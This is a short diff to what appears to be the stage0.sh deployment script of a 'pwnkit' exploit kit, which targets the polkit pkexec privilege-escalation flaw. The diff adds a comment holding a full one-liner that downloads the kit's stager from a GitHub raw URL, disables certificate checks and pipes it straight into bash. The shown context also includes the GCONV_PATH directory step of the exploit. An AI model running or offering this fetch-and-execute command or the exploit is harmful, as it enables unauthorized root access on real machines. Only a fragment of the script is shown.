@@ -2,6 +2,7 @@
 
 #deploy using command below, where url is the url hosting this file and C files.
 #command -v curl >/dev/null && bash -c "$(curl -fsSLk url)" || bash -c "$(wget --no-check-certificate -q0- url)"
+#example: command -v curl >/dev/null && bash -c "$(curl -fsSLk raw.githubusercontent.com/secw01f/pwnkit/main/stage0.sh)" || bash -c "$(wget --no-check-certificate -q0- raw.githubusercontent.com/secw01f/pwnkit/main/stage0.sh)"
 
 mkdir -p 'GCONV_PATH=.'
 
